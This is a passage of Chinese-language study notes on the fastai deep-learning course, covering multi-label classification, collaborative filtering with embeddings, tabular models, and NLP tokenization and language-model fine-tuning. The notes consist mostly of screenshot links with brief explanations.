src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/157.png"><br>显存不够或者是想加快训练速度时<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/158.png"><br>代价是准确率降低</p><blockquote><p>用小模型做数据清洗和测试不错</p></blockquote><h1 id="Multi-label-classification"><a href="#Multi-label-classification" class="headerlink" title="Multi-label classification"></a>Multi-label classification</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/159.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/160.png"><br>取第一列<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/161.png"><br>取第一行<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/162.png"><br>这两种写法效果完全一致<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/163.png"><br>创建新的列<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/164.png"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="Constructing-a-DataBlock"><a href="#Constructing-a-DataBlock" class="headerlink" title="Constructing a DataBlock"></a>Constructing a DataBlock</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/165.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/166.png"><br>以 tuple 格式返回每组对应元素<br>下面这种写法是一样的效果<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/167.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/168.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/169.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/170.png"><br>所以这是我们在fastai中建立自变量和因变量的主要方法<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/171.png"><br>上面这些麻烦，所以用datablock</p><h3 id="DataBlock"><a href="#DataBlock" class="headerlink" title="DataBlock"></a>DataBlock</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/172.png"><br>之后传入dataframe<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/173.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/174.png"><br>可以看到如果不给定xy的话那就得不到我们想要的自变量（图片）和因变量（标签）<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/175.png"><br>也可以这么写<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/176.png"><br>当然只得到一个文件名是不够的，要得到他的路径<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/177.png"><br>为了获取图片，需要传入对应的blocks<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/178.png"><br>这里是独热编码，多标签的分类用独热编码很方便。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/179.png"><br>对【19】的理解：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/180.png"></p><h2 id="划分验证集"><a href="#划分验证集" class="headerlink" title="划分验证集"></a>划分验证集</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/181.png"><br>要按照csv中的标签划分验证集，同样是传入一个参数<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/182.png"><br>DataFrame-》DataBlock-》DataLoader（注意没有Dataset）<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/183.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/184.png"></p><h3 id="Binary-Cross-Entropy"><a href="#Binary-Cross-Entropy" class="headerlink" title="Binary Cross-Entropy"></a>Binary Cross-Entropy</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/185.png"><br>一个batch有64张图，每个图对应20个可能的标签<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/186.png"><br>还没有训练所以这里面的参数值其实是随机的<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/187.png"><br>由于广播机制这个函数会作用在每一列上<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/188.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/189.png"><br>注意这里是用了sigmoid做多标签分类，softmax也可以<br>BCE的特殊之处就在于取了log</p><h2 id="调整准确率函数"><a href="#调整准确率函数" class="headerlink" title="调整准确率函数"></a>调整准确率函数</h2><p>设置阈值0.5<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/190.png"></p><h3 id="借助partial函数调整函数参数的默认值"><a href="#借助partial函数调整函数参数的默认值" class="headerlink" title="借助partial函数调整函数参数的默认值"></a>借助partial函数调整函数参数的默认值</h3><p>例子如下图<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/191.png"><br>freeze_epoch期间可以只训练最后层<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/192.png"><br>也可以指定损失函数<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/193.png"><br>选择阈值很重要。如果选择的阈值太低，则通常无法选择正确标记的对象。我们可以通过更改度量，然后调用validate来看到这一点，validate返回验证损失和度量：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/194.png"></p><h3 id="挑选合适的阈值"><a href="#挑选合适的阈值" class="headerlink" title="挑选合适的阈值"></a>挑选合适的阈值</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/195.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/196.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/197.png"></p><h1 id="人脸中心点检测（图像回归问题）"><a href="#人脸中心点检测（图像回归问题）" class="headerlink" title="人脸中心点检测（图像回归问题）"></a>人脸中心点检测（图像回归问题）</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/198.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/199.png"><br>设置每张图片对应的标签<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/200.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/201.png"><br>获取人脸中心位置坐标<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/202.png"><br>选择13号文件夹下的图片做验证集<br>数据增强已经标准化（标准化其实可以自动完成）<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/203.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/204.png"><br>其中3指的是3个chanel<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/205.png"><br>取值范围显然是在【-1,1】</p><h2 id="Training-a-model"><a href="#Training-a-model" class="headerlink" title="Training a model"></a>Training a model</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/206.png"><br>实现方法：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/207.png"></p><h3 id="损失函数-1"><a href="#损失函数-1" class="headerlink" title="损失函数"></a>损失函数</h3><p>在构建回归模型时均方误差非常常用，另外他的梯度也很好，用来当损失函数和评价指标都可以<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/208.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/209.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/210.png"><br>将均方误差开根得到均方根误差<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/211.png"></p><h3 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/212.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/213.png"></p><h1 id="协同过滤"><a href="#协同过滤" class="headerlink" title="协同过滤"></a>协同过滤</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/214.png"><br>这部电影作为动作片的系数是0.98。。。。。<br>这个人喜欢动作电影的系数是0.9，战争类的是0,8,科普类的是-0.6<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/215.png"><br>原始数据，协同过滤要做的就是确定图中空白位置的值<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/216.png"><br>先随机生成蓝色部分和黄色部分的数据，然后训练，以确定这两个部分的系数，从而预测出空白位置的值<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/217.png"></p><h2 id="Creating-the-DataLoaders"><a href="#Creating-the-DataLoaders" class="headerlink" title="Creating the DataLoaders"></a>Creating the DataLoaders</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/218.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/219.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/220.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/221.png"><br>取出第四行的数据<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/222.png"></p><h2 id="Embedding"><a href="#Embedding" class="headerlink" title="Embedding"></a>Embedding</h2><h2 id="Embedding-1"><a href="#Embedding-1" class="headerlink" title="Embedding"></a>Embedding</h2><p>要知道embedding的作用，首先要了解独热编码(one-hot encoding)。假设现在有如下对应编码关系：<br>0：我<br>1：是<br>2：一<br>3：头<br>4：猪<br>那么用来表示一句话比如：“我是猪”表示为：<br>0，1，4<br>而one-hot编码中只存在 0 和1，有多少个字要编码，独热编码的每一行长度就会有多长，比如字典中一共有 5 个字 “我是一头猪” 被从 0-4 进行了编码，那么独热编码的每一行就会有5个用 0或1表示的位置，即使可能要表达的语句只有很短的句子，例如：<br>[1,0,0,0,0] 我–0<br>[0,1,0,0,0] 是–1<br>[0,0,0,0,1] 猪–4<br>在每一句对应的编码位置会被设置成 1，其余的地方都是 0，也就是说，每一行只会有一个1。<br><strong>one-hot编码的优势是：计算方便快捷、表达能力强。</strong> 因为对于这样的稀疏矩阵做矩阵计算的时候，只需要把1对应位置的数相乘求和就可以，但问题也很明显，稀疏矩阵的资源占用太恐怖了，尤其体现在长篇文字的处理中，例如：<br>简体汉字常用3000个被从0-2999编号，也就是说在这套系统中<strong>每个单字的独热编码是3000位</strong>，如果你现在<strong>有一篇10000字的文章</strong>，那么用独热编码的方式编码之后其大小为10000×3000 = 30000000，很恐怖吧，最重要的是，其中很多东西是重复的，只是在文章的不同位置，这样会大量的浪费存储空间。所以如何解决这个问题呢····<br><strong>embedding应运而生</strong>~~~~<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/223.png"><br>embedding的原理是使用矩阵乘法来进行降维，从而达到节约存储空间的目的。<br>假设：我们有一个 2 × 6 2 × 62×6 的矩阵，然后乘上一个 6 × 3 6 × 36×3 的矩阵后，变成了一个2 × 3 2 × 32×3 的矩阵。<br>先不管它什么意思，这个过程，我们把一个12个元素的矩阵变成6个元素的矩阵，直观上，大小是不是缩小了一半？<br>而且，值得注意的是，虽然直观上矩阵的大小变小了，但是其实数字蕴藏的信息并没有改变，<strong>只是按照某一种映射关系将原本矩阵的信息转换到了一个新的维度的矩阵里面</strong>；只要按照逆向的映射关系，对矩阵进行相乘，其又会回到本身的模样！！！从这里来看，<strong>embedding是通过某种矩阵乘法来实现矩阵数据的降维</strong>。<br><strong>如果你想把数据使用另外一个维度的张量来表示，而不想造成信息的损失，可以使用 embedding 来调整。</strong></p><p><strong>那么embedding 除了实现降维之外，还有一个很重要的逆向功能–升维</strong>。<br>当矩阵维度很低的时候，有些有效的信息是不能够被很完整地提取出来的，举个不恰当的例子：<br>在纸上写了一个字<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/224.png"><br>经过embedding之后相当于把纸折起来或者揉搓了一下，变成了：<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/225.png"><br>所以在提取信息的时候可能无法非常顺理，而通过 embedding 进行升维之后，就相当于将整张纸展开，方便于<strong>改变成不同的感受野</strong>进行信息的提取。<br><strong>对低维的数据进行升维时，可能把一些其他特征给放大了，或者把笼统的特征给分开了。同时，这个embedding是一直在学习在优化的，就使得整个过程慢慢形成一个良好的观察点</strong>。</p><p>所以说embedding过程就是矩阵乘法过程，用来把输入降维度</p><p>Embedding实现了矩阵乘法取索引值而无需手动设置onehot向量<br>也就是用独热编码矩阵代替了数组查找方式<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/226.png"><br>这个函数的发音是dunder init</p><h2 id="Module类"><a href="#Module类" class="headerlink" title="Module类"></a>Module类</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/227.png"><br>其中这个init是创建的时候初始化用的，后面训练的时候都是用forward()来传参数的<br>x就是userid和movid<br>第一个是x[:,0]<br>第二个是x[:,1]<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/228.png"><br>让每个user和每个mov都获得所对应的向量<br>来看一下他们各自的shape<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/229.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/230.png"><br>这样计算出来的就是绿框里的部分<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/231.png"><br>第一个维度是mini-batch的维度，所以要对第二个维度sum，最后得到的就是点乘的结果<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/232.png"></p><h2 id="训练-1"><a href="#训练-1" class="headerlink" title="训练"></a>训练</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/233.png"></p><h2 id="调优"><a href="#调优" class="headerlink" title="调优"></a>调优</h2><p>回归类型的数据分析，最好告诉fastai标签的数据范围<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/234.png"><br>这里相当于是<br>（res,0,5.5）<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/235.png"><br>有的用户就是喜欢打低分，那就加上偏置<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/236.png"><br>过拟合了<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/237.png"></p><h1 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/238.png"></p><h2 id="Creating-our-own-Embedding-module"><a href="#Creating-our-own-Embedding-module" class="headerlink" title="Creating our own Embedding module"></a>Creating our own Embedding module</h2><p>所以嵌入的意思就是矩阵中的索引<br>而且最好是创建一个自己的版本<br>嵌入层实际上是从Module继承而来的。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/239.png"><br>但是只这么写是不会被学习的，要像下面这么写。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/240.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/241.png">这样的函数不需要像上面一样那么写，因为他已经自动被调用了。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/242.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/243.png"><br>因此像上图一样这样创建的Parameter就可以被学习了。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/244.png"></p><h2 id="Interpreting-embeddings-and-biases"><a href="#Interpreting-embeddings-and-biases" class="headerlink" title="Interpreting embeddings and biases"></a>Interpreting embeddings and biases</h2><p>查看偏置最小的五条数据。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/245.png"><br>这是大家最不喜欢的五部电影。<br>相反，以下是大家最喜欢的五部电影。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/246.png"></p><h3 id="使用PCA分析"><a href="#使用PCA分析" class="headerlink" title="使用PCA分析"></a>使用PCA分析</h3><p>他就是会把50个因素压缩到三个。<br>可以看到一些电影都找到了他们自己所属的那一个空间。<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/247.png"></p><h2 id="用fastai完成协同过滤"><a href="#用fastai完成协同过滤" class="headerlink" title="用fastai完成协同过滤"></a>用fastai完成协同过滤</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/248.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/249.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/250.png"></p><h2 id="用余弦相似度查看相似的电影"><a href="#用余弦相似度查看相似的电影" class="headerlink" title="用余弦相似度查看相似的电影"></a>用余弦相似度查看相似的电影</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/251.png"></p><h2 id="如果不用点积"><a href="#如果不用点积" class="headerlink" title="如果不用点积"></a>如果不用点积</h2><p>就可以为不同的用户以及不同的电影设置不同的Embedding,这样更灵活<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/252.png"><br>fastai有一个函数get_emb_sz()，它根据fast.ai发现的一个启发式方法返回数据嵌入矩阵的建议大小，该方法在实践中效果很好：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/253.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/254.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/255.png"><br>或者直接<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/256.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/257.png"><br>这里用到了表格模型。</p><h2 id="Tabular"><a href="#Tabular" class="headerlink" title="Tabular"></a>Tabular</h2><p>用上述的神经网络是可以的，也可以用随机森林</p><h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><h3 id="使用kaggleAPI"><a href="#使用kaggleAPI" class="headerlink" title="使用kaggleAPI"></a>使用kaggleAPI</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/258.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/259.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/260.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/261.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/262.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/263.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/264.png"></p><h3 id="加载数据-1"><a href="#加载数据-1" class="headerlink" title="加载数据"></a>加载数据</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/265.png"></p><h3 id="查看一下有哪些列"><a href="#查看一下有哪些列" class="headerlink" title="查看一下有哪些列"></a>查看一下有哪些列</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/266.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/267.png"><br>将此属性转化为有序类别<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/268.png"><br>选择因变量并将其转换为对数，因为kaggle要求这么做<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/269.png"></p><h3 id="决策树-1"><a href="#决策树-1" class="headerlink" title="决策树"></a>决策树</h3><p>创建决策树的流程：<br>(暂略)</p><h1 id="NLP"><a href="#NLP" class="headerlink" title="NLP"></a>NLP</h1><h2 id="准备数据-1"><a href="#准备数据-1" class="headerlink" title="准备数据"></a>准备数据</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/270.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/271.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/272.png"></p><h2 id="Tokenization"><a href="#Tokenization" class="headerlink" title="Tokenization"></a>Tokenization</h2><p>将文本转化为一组单词或词条,那么句号算不算是一个词条呢?通常有三种划分方式<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/273.png"><br>fastai默认分词器spaCy<br>使用WordTokenizer（）创建分词器，会自动分配一个合适的分词器<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/274.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/275.png"><br>为上一步的分词器扩展功能：将大写字母转换成小写，并在词前用xxmaj做标记，因为一个单词无论是大写还是小写都应该都应同一个向量<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/276.png"><br>To see the rules that were used, you can check the default rules:<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/277.png"><br>As always, you can look at the source code of each of them in a notebook by typing:<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/278.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/279.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/280.png"></p><h2 id="Subword-tokenization-子分词器"><a href="#Subword-tokenization-子分词器" class="headerlink" title="Subword tokenization(子分词器"></a>Subword tokenization(子分词器</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/281.png"><br>在语料库中找出现频次最高的字符组合，构成单词<br>比如：<br>‘我的’会经常出现，因为他的意思是‘my’<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/282.png"><br>我们实例化标记器，传入要创建的vocab的大小，然后需要“训练”它。也就是说，我们需要让它阅读我们的文档，找到共同的字符序列来创建vocab。这是通过设置完成的。我们很快就会看到，setup是一种特殊的fastai方法，在我们通常的数据处理管道中自动调用。但是，由于我们现在都是手工操作，所以我们必须自己调用它。下面是一个函数，它对给定的vocab大小执行以下步骤，并显示一个示例输出：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/283.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/284.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/285.png"></p><h3 id="Numericalization-with-fastai"><a href="#Numericalization-with-fastai" class="headerlink" title="Numericalization with fastai"></a>Numericalization with fastai</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/286.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/287.png"><br>对上一步分好的单词，每个单词都编一个号<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/288.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/289.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/290.png"><br>默认的词汇量是60000，也就是embedding矩阵的大小，如果还有没覆盖到的，就替换到出现频次最低的词<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/291.png"><br>变回原来的样子<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/292.png"></p><h2 id="batch"><a href="#batch" class="headerlink" title="batch"></a>batch</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/293.png"><br>对有几百万token的IMDB数据来说，每行数据太多，所以要进行拆分（用列拆分）<br>举个例子：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/294.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/295.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/296.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/297.png"><br>以上得到的就是三个mini-batch，注意行和行之间是完全独立的<br>以上步骤很麻烦，不过都不用我们自己做，直接用fastai的LMDataLoader就行</p><h2 id="使用fastai"><a href="#使用fastai" class="headerlink" title="使用fastai"></a>使用fastai</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/298.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/299.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/300.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/301.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/302.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/303.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/304.png"><br>上图中的前两行必不可少，setup（）用来创建字典<br>数字化：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/305.png"><br>（上图效果演示：<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/306.png">）<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/307.png"><br>64是batch-size，序列长度是72<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/308.png"><br>（xxunk表示vocab中没有 这个词）<br>再看看验证集中的数据<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/309.png"><br>可以看到验证集的数据相比训练集左移了一位</p><h3 id="Training-a-text-classifier"><a href="#Training-a-text-classifier" class="headerlink" title="Training a text classifier"></a>Training a text classifier</h3><h4 id="Language-model-using-DataBlock"><a href="#Language-model-using-DataBlock" class="headerlink" title="Language model using DataBlock"></a>Language model using DataBlock</h4><p>当TextBlock传递给DataBlock时，fastai自动处理标记化和数值化。可以传递给Tokenize和Numericalize的所有参数也可以传递给TextBlock。在下一章中，我们将讨论分别运行这些步骤的最简单方法，以简化调试，但您始终可以通过在前几节中所示的数据子集上手动运行这些步骤来进行调试。别忘了DataBlock便捷的summary方法，它对于调试数据问题非常有用<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/310.png"><br>这里使用了一个类方法，可以存储分词的结果到这里面，下次可以从存储的数据接着运行</p><p>与以前在DataBlock中使用的类型不同的一点是，我们不仅仅直接使用类（即TextBlock（…），而是调用类方法。类方法是一种Python方法，顾名思义，它属于类而不是对象(如果您不熟悉类方法，请务必在线搜索有关它们的更多信息，因为它们在许多Python库和应用程序中都很常用；我们以前在书中使用过几次，但没有引起注意。）TextBlock之所以特别，是因为设置numericalizer的vocab可能需要很长时间（我们必须阅读并标记每个文档才能获得vocab）。为了尽可能地提高效率，它执行了一些优化：•它将标记化文档保存在临时文件夹中，因此不必多次标记化文档•它并行运行多个标记化进程，以利用计算机的CPU我们需要告诉TextBlock如何访问文本，所以它可以做这个初始的预处理，这是从\u文件夹做的。显示\u批处理然后以通常的方式工作：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/311.png"><br>也就是说show_batches()会自动de-数字化</p><h3 id="Fine-tuning-the-language-model"><a href="#Fine-tuning-the-language-model" class="headerlink" title="Fine tuning the language model"></a>Fine tuning the language model</h3><h4 id="创建学习器"><a href="#创建学习器" class="headerlink" title="创建学习器"></a>创建学习器</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/312.png"><br>让我们回到本章开头的流程图。第一个arrow已为我们完成，并在fastai作为预训练模型提供，<br>我们刚刚为第二阶段构建了数据加载器和学习器。现在<br>我们已经准备好微调我们的语言模型了！<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/313.png"><br>训练每个epoch需要相当长的时间，因此我们将在训练过程中保存中间模型结果。因为微调不适合我们，所以我们将使用fit\u one\u cycle。就像cnn\u learner一样，language\u model\u learner在使用预训练模型（这是默认值）时会自动调用freeze，因此这只会训练嵌入（模型中唯一包含随机初始化权重的部分，即嵌入IMDb vocab中但不在预训练模型vocab中的单词）：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/314.png"></p><h3 id="Saving-and-Loading-Models"><a href="#Saving-and-Loading-Models" class="headerlink" title="Saving and Loading Models"></a>Saving and Loading Models</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/315.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/316.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/317.png"><br>行话：编码器：模型不包括特定于任务的最终层。当应用于视觉CNN时，这个术语和身体的含义基本相同，但“编码器”往往更多地用于NLP和生成模型。<br>得到不包括最后一层的model，这是个预训练模型，他经过了wiki和imdb下一个词预测的双重预训练，之后开始将这个模型用于分类任务。</p><h2 id="Text-generation"><a 